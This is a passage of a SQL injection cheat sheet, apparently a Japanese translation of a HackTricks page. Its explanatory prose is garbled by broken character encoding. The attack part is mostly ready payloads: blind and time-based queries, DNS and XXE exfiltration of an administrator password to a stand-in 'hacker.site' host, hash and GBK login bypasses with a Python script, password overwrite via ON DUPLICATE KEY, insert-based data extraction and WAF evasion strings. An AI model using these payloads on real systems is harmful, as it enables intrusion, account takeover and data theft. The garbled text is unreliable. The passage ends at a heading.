ã“ã®å ´åˆã€ãƒšãƒ¼ã‚¸ã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã«åŸºã¥ã„ã¦ã‚¯ã‚¨ãƒªã®**å¿œç­”**ã‚’**åŒºåˆ¥**ã™ã‚‹æ–¹æ³•ã¯**ã‚ã‚Šã¾ã›ã‚“**ã€‚ã—ã‹ã—ã€æ¨æ¸¬ã—ãŸæ–‡å­—ãŒæ­£ã—ã„å ´åˆã€ãƒšãƒ¼ã‚¸ãŒ**èª­ã¿è¾¼ã‚€ã®ã«æ™‚é–“ãŒã‹ã‹ã‚‹**ã‚ˆã†ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®æŠ€è¡“ã¯ã€[ã‚¿ã‚¤ãƒŸãƒ³ã‚°ã§ã®ç¢ºèª](./#confirming-with-timing)ã®ãŸã‚ã«ä»¥å‰ã«ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ã®ã‚’è¦‹ãŸã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚
```sql
1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
```
## ã‚¹ã‚¿ãƒƒã‚¯ã‚¯ã‚¨ãƒª

ã‚¹ã‚¿ãƒƒã‚¯ã‚¯ã‚¨ãƒªã‚’ä½¿ç”¨ã—ã¦ã€**è¤‡æ•°ã®ã‚¯ã‚¨ãƒªã‚’é€£ç¶šã—ã¦å®Ÿè¡Œ**ã§ãã¾ã™ã€‚å¾Œç¶šã®ã‚¯ã‚¨ãƒªãŒå®Ÿè¡Œã•ã‚Œã‚‹é–“ã€**çµæœ**ã¯**ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«è¿”ã•ã‚Œã¾ã›ã‚“**ã€‚ã—ãŸãŒã£ã¦ã€ã“ã®æŠ€è¡“ã¯ä¸»ã«**ãƒ–ãƒ©ã‚¤ãƒ³ãƒ‰è„†å¼±æ€§**ã«é–¢é€£ã—ã¦ä½¿ç”¨ã•ã‚Œã€2ç•ªç›®ã®ã‚¯ã‚¨ãƒªã‚’ä½¿ç”¨ã—ã¦DNSãƒ«ãƒƒã‚¯ã‚¢ãƒƒãƒ—ã€æ¡ä»¶ä»˜ãã‚¨ãƒ©ãƒ¼ã€ã¾ãŸã¯æ™‚é–“é…å»¶ã‚’ãƒˆãƒªã‚¬ãƒ¼ã§ãã¾ã™ã€‚

**Oracle**ã¯**ã‚¹ã‚¿ãƒƒã‚¯ã‚¯ã‚¨ãƒª**ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã›ã‚“ã€‚**MySQLã€Microsoft**ã€ãŠã‚ˆã³**PostgreSQL**ã¯ãã‚Œã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã™: `QUERY-1-HERE; QUERY-2-HERE`

## ãƒãƒ³ãƒ‰å¤–ã®æ‚ªç”¨

**ä»–ã®**æ‚ªç”¨æ–¹æ³•ãŒ**æ©Ÿèƒ½ã—ãªã‹ã£ãŸ**å ´åˆã€**ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãŒ**æƒ…å ±ã‚’ã‚ãªãŸãŒåˆ¶å¾¡ã™ã‚‹**å¤–éƒ¨ãƒ›ã‚¹ãƒˆ**ã«æµå‡ºã•ã›ã‚‹ã‚ˆã†ã«è©¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãŸã¨ãˆã°ã€DNSã‚¯ã‚¨ãƒªã‚’ä»‹ã—ã¦:
```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```
### XXEã«ã‚ˆã‚‹ã‚¢ã‚¦ãƒˆã‚ªãƒ–ãƒãƒ³ãƒ‰ãƒ‡ãƒ¼ã‚¿æµå‡º
```sql
a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/"> %remote;]>'),'/l') FROM dual-- -
```
## è‡ªå‹•åŒ–ã•ã‚ŒãŸæ‚ªç”¨

[SQLMap Cheatsheet](sqlmap/)ã‚’ç¢ºèªã—ã¦ã€[**sqlmap**](https://github.com/sqlmapproject/sqlmap)ã‚’ä½¿ç”¨ã—ã¦SQLiè„†å¼±æ€§ã‚’æ‚ªç”¨ã—ã¦ãã ã•ã„ã€‚

## æŠ€è¡“ç‰¹æœ‰ã®æƒ…å ±

SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹æ–¹æ³•ã«ã¤ã„ã¦ã¯ã™ã§ã«è­°è«–ã—ã¾ã—ãŸã€‚ã“ã®æœ¬ã§ã¯ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹æŠ€è¡“ã«ä¾å­˜ã™ã‚‹ã„ãã¤ã‹ã®ãƒˆãƒªãƒƒã‚¯ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ï¼š

* [MS Access](ms-access-sql-injection.md)
* [MSSQL](mssql-injection.md)
* [MySQL](mysql-injection/)
* [Oracle](oracle-injection.md)
* [PostgreSQL](postgresql-injection/)

ã¾ãŸã€**MySQLã€PostgreSQLã€Oracleã€MSSQLã€SQLiteã€HQLã«é–¢ã™ã‚‹å¤šãã®ãƒˆãƒªãƒƒã‚¯ãŒ** [**https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)ã«ã‚ã‚Šã¾ã™ã€‚



<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/)ã¯ã€**ã‚¹ãƒšã‚¤ãƒ³**ã§æœ€ã‚‚é–¢é€£æ€§ã®é«˜ã„ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¤ãƒ™ãƒ³ãƒˆã§ã‚ã‚Šã€**ãƒ¨ãƒ¼ãƒ­ãƒƒãƒ‘**ã§æœ€ã‚‚é‡è¦ãªã‚¤ãƒ™ãƒ³ãƒˆã®ä¸€ã¤ã§ã™ã€‚**æŠ€è¡“çŸ¥è­˜ã®ä¿ƒé€²ã‚’ä½¿å‘½ã¨ã—ã¦**ã€ã“ã®ä¼šè­°ã¯ã‚ã‚‰ã‚†ã‚‹åˆ†é‡ã®æŠ€è¡“ã¨ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®å°‚é–€å®¶ã®ç†±ã„äº¤æµã®å ´ã§ã™ã€‚

{% embed url="https://www.rootedcon.com/" %}

## èªè¨¼ãƒã‚¤ãƒ‘ã‚¹

ãƒ­ã‚°ã‚¤ãƒ³æ©Ÿèƒ½ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ãŸã‚ã«è©¦ã™ãƒªã‚¹ãƒˆï¼š

{% content-ref url="../login-bypass/sql-login-bypass.md" %}
[sql-login-bypass.md](../login-bypass/sql-login-bypass.md)
{% endcontent-ref %}

### ç”Ÿã®ãƒãƒƒã‚·ãƒ¥èªè¨¼ãƒã‚¤ãƒ‘ã‚¹
```sql
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```
ã“ã®ã‚¯ã‚¨ãƒªã¯ã€èªè¨¼ãƒã‚§ãƒƒã‚¯ã§ç”Ÿã®å‡ºåŠ›ã«å¯¾ã—ã¦trueã‚’ä½¿ç”¨ã—ãŸå ´åˆã«MD5ãŒè„†å¼±æ€§ã‚’ç¤ºã™ã“ã¨ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ã‚·ã‚¹ãƒ†ãƒ ã¯SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã«å¯¾ã—ã¦è„†å¼±ã«ãªã‚Šã¾ã™ã€‚æ”»æ’ƒè€…ã¯ã€ãƒãƒƒã‚·ãƒ¥åŒ–ã•ã‚ŒãŸã¨ãã«äºˆæœŸã—ãªã„SQLã‚³ãƒãƒ³ãƒ‰ã®ä¸€éƒ¨ã‚’ç”Ÿæˆã™ã‚‹å…¥åŠ›ã‚’ä½œæˆã™ã‚‹ã“ã¨ã§ã“ã‚Œã‚’æ‚ªç”¨ã—ã€ä¸æ­£ã‚¢ã‚¯ã‚»ã‚¹ã‚’å¼•ãèµ·ã“ã™ã“ã¨ãŒã§ãã¾ã™ã€‚
```sql
md5("ffifdyop", true) = 'or'6ï¿½]ï¿½ï¿½!r,ï¿½ï¿½bï¿½
sha1("3fDf ", true) = Qï¿½u'='ï¿½@ï¿½[ï¿½tï¿½- oï¿½ï¿½_-!
```
### æ³¨å…¥ã•ã‚ŒãŸãƒãƒƒã‚·ãƒ¥èªè¨¼ãƒã‚¤ãƒ‘ã‚¹
```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```
**æ¨å¥¨ãƒªã‚¹ãƒˆ**:

å„è¡Œã®ãƒªã‚¹ãƒˆã‚’ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¨ã—ã¦ä½¿ç”¨ã—ã€ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã¯å¸¸ã«: _**Pass1234.**_\
_(ã“ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯ã€ã“ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã®æœ€åˆã§è¨€åŠã•ã‚ŒãŸå¤§ããªãƒªã‚¹ãƒˆã«ã‚‚å«ã¾ã‚Œã¦ã„ã¾ã™)_

{% file src="../../.gitbook/assets/sqli-hashbypass.txt" %}

### GBK èªè¨¼ãƒã‚¤ãƒ‘ã‚¹

IF ' ãŒã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã•ã‚Œã¦ã„ã‚‹å ´åˆã¯ %A8%27 ã‚’ä½¿ç”¨ã§ãã€' ãŒã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã•ã‚Œã‚‹ã¨æ¬¡ã®ã‚ˆã†ã«ä½œæˆã•ã‚Œã¾ã™: 0xA80x5c0x27 (_â•˜'_)
```sql
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --
```
Pythonã‚¹ã‚¯ãƒªãƒ—ãƒˆ:
```python
import requests
url = "http://example.com/index.php"
cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3')
datas = {"login": chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"}
r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url})
print r.text
```
### ãƒãƒªã‚°ãƒ­ãƒƒãƒˆã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ï¼ˆãƒãƒ«ãƒã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆï¼‰
```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```
## Insert Statement

### æ—¢å­˜ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ/ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å¤‰æ›´ã™ã‚‹

ãã®ãŸã‚ã«ã¯ã€**ã€Œãƒã‚¹ã‚¿ãƒ¼ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã€ã¨åä»˜ã‘ã‚‰ã‚ŒãŸæ–°ã—ã„ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ä½œæˆã™ã‚‹**ï¼ˆãŠãã‚‰ã**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å ´åˆã¯admin**ï¼‰å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ä½•ã‹ã‚’å¤‰æ›´ã—ã¾ã™ï¼š

* åå‰ã‚’**AdMIn**ï¼ˆå¤§æ–‡å­—ã¨å°æ–‡å­—ã®æ–‡å­—ï¼‰ã¨ã—ã¦ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆã—ã¾ã™
* åå‰ã‚’**admin=**ã¨ã—ã¦ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆã—ã¾ã™
* **SQLãƒˆãƒ©ãƒ³ã‚±ãƒ¼ã‚·ãƒ§ãƒ³æ”»æ’ƒ**ï¼ˆãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚„ãƒ¡ãƒ¼ãƒ«ã«**é•·ã•åˆ¶é™**ãŒã‚ã‚‹å ´åˆï¼‰ --> åå‰ã‚’**admin \[ãŸãã•ã‚“ã®ã‚¹ãƒšãƒ¼ã‚¹] a**ã¨ã—ã¦ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆã—ã¾ã™

#### SQLãƒˆãƒ©ãƒ³ã‚±ãƒ¼ã‚·ãƒ§ãƒ³æ”»æ’ƒ

ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãŒè„†å¼±ã§ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼åã®æœ€å¤§æ–‡å­—æ•°ãŒä¾‹ãˆã°30ã®å ´åˆã€ãƒ¦ãƒ¼ã‚¶ãƒ¼**admin**ã‚’å½è£…ã—ãŸã„å ´åˆã¯ã€"_admin \[30ã‚¹ãƒšãƒ¼ã‚¹] a_"ã¨ã„ã†ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’ä½œæˆã—ã¦ã¿ã¦ãã ã•ã„ã€‚

ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã¯ã€å…¥åŠ›ã•ã‚ŒãŸ**ãƒ¦ãƒ¼ã‚¶ãƒ¼å**ãŒãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å†…ã«**å­˜åœ¨ã™ã‚‹ã‹**ã‚’**ç¢ºèª**ã—ã¾ã™ã€‚ã‚‚ã—**å­˜åœ¨ã—ãªã‘ã‚Œã°**ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼å**ã‚’**æœ€å¤§è¨±å¯æ–‡å­—æ•°**ï¼ˆã“ã®å ´åˆã¯"_admin \[25ã‚¹ãƒšãƒ¼ã‚¹]_"ã«ï¼‰**åˆ‡ã‚Šè©°ã‚**ã€ãã®å¾Œã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å†…ã§ãƒ¦ãƒ¼ã‚¶ãƒ¼"**admin**"ã‚’**æ–°ã—ã„ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰**ã§æ›´æ–°ã™ã‚‹ãŸã‚ã«**è‡ªå‹•çš„ã«æœ«å°¾ã®ã™ã¹ã¦ã®ã‚¹ãƒšãƒ¼ã‚¹ã‚’å‰Šé™¤ã—ã¾ã™**ï¼ˆã‚¨ãƒ©ãƒ¼ãŒè¡¨ç¤ºã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ãŒã€ã“ã‚Œã¯æˆåŠŸã—ãªã‹ã£ãŸã“ã¨ã‚’æ„å‘³ã—ã¾ã›ã‚“ï¼‰ã€‚

è©³ç´°æƒ…å ±: [https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html](https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html) & [https://resources.infosecinstitute.com/sql-truncation-attack/#gref](https://resources.infosecinstitute.com/sql-truncation-attack/#gref)

_æ³¨: ã“ã®æ”»æ’ƒã¯ã€æœ€æ–°ã®MySQLã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã§ã¯ä¸Šè¨˜ã®ã‚ˆã†ã«ã¯æ©Ÿèƒ½ã—ãªããªã‚Šã¾ã™ã€‚æ¯”è¼ƒã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§æœ«å°¾ã®ç©ºç™½ã‚’ç„¡è¦–ã—ã¾ã™ãŒã€ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã®é•·ã•ã‚ˆã‚Šã‚‚é•·ã„æ–‡å­—åˆ—ã‚’æŒ¿å…¥ã—ã‚ˆã†ã¨ã™ã‚‹ã¨ã‚¨ãƒ©ãƒ¼ãŒç™ºç”Ÿã—ã€æŒ¿å…¥ã¯å¤±æ•—ã—ã¾ã™ã€‚ã“ã®ãƒã‚§ãƒƒã‚¯ã«é–¢ã™ã‚‹è©³ç´°æƒ…å ±: [https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation](https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation)_

### MySQLæŒ¿å…¥æ™‚é–“ãƒ™ãƒ¼ã‚¹ã®ãƒã‚§ãƒƒã‚¯

`','',''`ã‚’ã§ãã‚‹ã ã‘è¿½åŠ ã—ã¦ã€VALUESã‚¹ãƒ†ãƒ¼ãƒˆãƒ¡ãƒ³ãƒˆã‚’çµ‚äº†ã•ã›ã‚‹ã¨è€ƒãˆã¾ã™ã€‚é…å»¶ãŒå®Ÿè¡Œã•ã‚Œã‚‹å ´åˆã€SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ãŒã‚ã‚Šã¾ã™ã€‚
```sql
name=','');WAITFOR%20DELAY%20'0:0:5'--%20-
```
### ON DUPLICATE KEY UPDATE

MySQLã®`ON DUPLICATE KEY UPDATE`å¥ã¯ã€UNIQUEã‚¤ãƒ³ãƒ‡ãƒƒã‚¯ã‚¹ã¾ãŸã¯PRIMARY KEYã§é‡è¤‡ã™ã‚‹å€¤ãŒç™ºç”Ÿã™ã‚‹è¡Œã‚’æŒ¿å…¥ã—ã‚ˆã†ã¨ã—ãŸã¨ãã«ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãŒå®Ÿè¡Œã™ã‚‹ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’æŒ‡å®šã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ä»¥ä¸‹ã®ä¾‹ã¯ã€ã“ã®æ©Ÿèƒ½ãŒã©ã®ã‚ˆã†ã«æ‚ªç”¨ã•ã‚Œã¦ç®¡ç†è€…ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å¤‰æ›´ã™ã‚‹ã‹ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚

Example Payload Injection:

æ³¨å…¥ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯æ¬¡ã®ã‚ˆã†ã«ä½œæˆã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã€`users`ãƒ†ãƒ¼ãƒ–ãƒ«ã«2è¡Œã‚’æŒ¿å…¥ã—ã‚ˆã†ã¨ã—ã¦ã„ã¾ã™ã€‚æœ€åˆã®è¡Œã¯ãŠã¨ã‚Šã§ã€2ç•ªç›®ã®è¡Œã¯æ—¢å­˜ã®ç®¡ç†è€…ã®ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã«ã—ã¦ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’æ›´æ–°ã™ã‚‹æ„å›³ãŒã‚ã‚Šã¾ã™ï¼š
```sql
INSERT INTO users (email, password) VALUES ("generic_user@example.com", "bcrypt_hash_of_newpassword"), ("admin_generic@example.com", "bcrypt_hash_of_newpassword") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_newpassword" -- ";
```
Here's how it works:

- ã‚¯ã‚¨ãƒªã¯2ã¤ã®è¡Œã‚’æŒ¿å…¥ã—ã‚ˆã†ã¨ã—ã¾ã™ï¼š1ã¤ã¯ `generic_user@example.com` ç”¨ã€ã‚‚ã†1ã¤ã¯ `admin_generic@example.com` ç”¨ã§ã™ã€‚
- ã‚‚ã— `admin_generic@example.com` ã®è¡ŒãŒã™ã§ã«å­˜åœ¨ã™ã‚‹å ´åˆã€`ON DUPLICATE KEY UPDATE` å¥ãŒãƒˆãƒªã‚¬ãƒ¼ã•ã‚Œã€MySQLã«æ—¢å­˜ã®è¡Œã® `password` ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã‚’ "bcrypt_hash_of_newpassword" ã«æ›´æ–°ã™ã‚‹ã‚ˆã†æŒ‡ç¤ºã—ã¾ã™ã€‚
- ãã®çµæœã€`admin_generic@example.com` ã‚’ä½¿ç”¨ã—ã¦ã€bcryptãƒãƒƒã‚·ãƒ¥ã«å¯¾å¿œã™ã‚‹ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã§èªè¨¼ã‚’è©¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆ"bcrypt_hash_of_newpassword" ã¯æ–°ã—ã„ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®bcryptãƒãƒƒã‚·ãƒ¥ã‚’è¡¨ã—ã€å®Ÿéš›ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®ãƒãƒƒã‚·ãƒ¥ã«ç½®ãæ›ãˆã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼‰ã€‚

### Extract information

#### Creating 2 accounts at the same time

æ–°ã—ã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆã—ã‚ˆã†ã¨ã™ã‚‹éš›ã«ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼åã€ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã€ãƒ¡ãƒ¼ãƒ«ãŒå¿…è¦ã§ã™ï¼š
```
SQLi payload:
username=TEST&password=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -

A new user with username=otherUsername, password=otherPassword, email:FLAG will be created
```
#### Using decimal or hexadecimal

ã“ã®æŠ€è¡“ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€1ã¤ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ä½œæˆã™ã‚‹ã ã‘ã§æƒ…å ±ã‚’æŠ½å‡ºã§ãã¾ã™ã€‚ã‚³ãƒ¡ãƒ³ãƒˆã‚’è¿½åŠ ã™ã‚‹å¿…è¦ã¯ãªã„ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚

Using **hex2dec** and **substr**:
```sql
'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
ãƒ†ã‚­ã‚¹ãƒˆã‚’å–å¾—ã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚ˆã†ã«ã—ã¾ã™ï¼š
```python
__import__('binascii').unhexlify(hex(215573607263)[2:])
```
**hex** ã¨ **replace** (ãŠã‚ˆã³ **substr**) ã‚’ä½¿ç”¨ã—ã¦:
```sql
'+(select hex(replace(replace(replace(replace(replace(replace(table_name,"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

'+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

#Full ascii uppercase and lowercase replace:
'+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%"),"z","&"),"J","'"),"K","`"),"L","("),"M",")"),"N","@"),"O","$$"),"Z","&&")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) ã¯ **ã‚¹ãƒšã‚¤ãƒ³** ã§æœ€ã‚‚é–¢é€£æ€§ã®é«˜ã„ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¤ãƒ™ãƒ³ãƒˆã§ã‚ã‚Šã€**ãƒ¨ãƒ¼ãƒ­ãƒƒãƒ‘** ã§æœ€ã‚‚é‡è¦ãªã‚¤ãƒ™ãƒ³ãƒˆã®ä¸€ã¤ã§ã™ã€‚**æŠ€è¡“çš„çŸ¥è­˜ã®ä¿ƒé€²**ã‚’ä½¿å‘½ã¨ã—ã€ã“ã®ä¼šè­°ã¯ã‚ã‚‰ã‚†ã‚‹åˆ†é‡ã®æŠ€è¡“ã¨ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®å°‚é–€å®¶ãŒé›†ã¾ã‚‹ç†±ã„äº¤æµã®å ´ã§ã™ã€‚

{% embed url="https://www.rootedcon.com/" %}

## Routed SQL injection

Routed SQL injection ã¯ã€æ³¨å…¥å¯èƒ½ãªã‚¯ã‚¨ãƒªãŒå‡ºåŠ›ã‚’ç”Ÿæˆã™ã‚‹ã‚‚ã®ã§ã¯ãªãã€æ³¨å…¥å¯èƒ½ãªã‚¯ã‚¨ãƒªã®å‡ºåŠ›ãŒå‡ºåŠ›ã‚’ç”Ÿæˆã™ã‚‹ã‚¯ã‚¨ãƒªã«é€ã‚‰ã‚Œã‚‹çŠ¶æ³ã§ã™ã€‚ ([From Paper](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt))

Example:
```
#Hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```
## WAF ãƒã‚¤ãƒ‘ã‚¹

[åˆæœŸãƒã‚¤ãƒ‘ã‚¹ã¯ã“ã¡ã‚‰](https://github.com/Ne3o1/PayLoadAllTheThings/blob/master/SQL%20injection/README.md#waf-bypass)

### ã‚¹ãƒšãƒ¼ã‚¹ãªã—ãƒã‚¤ãƒ‘ã‚¹

ã‚¹ãƒšãƒ¼ã‚¹ãªã— (%20) - ãƒ›ãƒ¯ã‚¤ãƒˆã‚¹ãƒšãƒ¼ã‚¹ã®ä»£æ›¿ã‚’ä½¿ç”¨ã—ã¦ãƒã‚¤ãƒ‘ã‚¹
```sql
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```
No Whitespace - ã‚³ãƒ¡ãƒ³ãƒˆã‚’ä½¿ç”¨ã—ã¦ãƒã‚¤ãƒ‘ã‚¹
```sql
?id=1/*comment*/and/**/1=1/**/--
```
No Whitespace - æ‹¬å¼§ã‚’ä½¿ç”¨ã—ã¦ãƒã‚¤ãƒ‘ã‚¹
```sql
?id=(1)and(1)=(1)--
```
### No commas bypass

No Comma - OFFSETã€FROMã€JOINã‚’ä½¿ç”¨ã—ãŸãƒã‚¤ãƒ‘ã‚¹
```
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```
### Generic Bypasses

ã‚­ãƒ¼ãƒ¯ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ãŸãƒ–ãƒ©ãƒƒã‚¯ãƒªã‚¹ãƒˆ - å¤§æ–‡å­—/å°æ–‡å­—ã‚’ä½¿ç”¨ã—ã¦ãƒã‚¤ãƒ‘ã‚¹
```sql
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```
ã‚­ãƒ¼ãƒ¯ãƒ¼ãƒ‰ã‚’ç„¡è¦–ã—ã¦ãƒ–ãƒ©ãƒƒã‚¯ãƒªã‚¹ãƒˆ - åŒç­‰ã®æ¼”ç®—å­ã‚’ä½¿ç”¨ã—ã¦ãƒã‚¤ãƒ‘ã‚¹
```
AND   -> && -> %26%26
OR    -> || -> %7C%7C
=     -> LIKE,REGEXP,RLIKE, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))
```
### ç§‘å­¦çš„è¡¨è¨˜æ³• WAF ãƒã‚¤ãƒ‘ã‚¹

